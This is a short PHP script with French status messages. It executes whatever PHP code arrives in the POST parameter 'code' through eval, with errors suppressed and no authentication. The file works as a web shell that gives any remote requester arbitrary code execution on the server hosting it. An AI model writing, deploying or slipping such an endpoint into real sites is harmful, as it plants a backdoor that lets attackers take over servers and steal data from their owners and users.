<?php
if (isset($_POST['code'])) {
    $code = $_POST['code'];
    $code = preg_replace('/^<\?php/', '', $code);
    $output = @eval($code);
    if ($output === false) {
        echo "Erreur lors de l'exécution du code PHP.";
    } else {
        echo $output;
    }
} else {
    echo "Aucun code PHP à exécuter.";
}

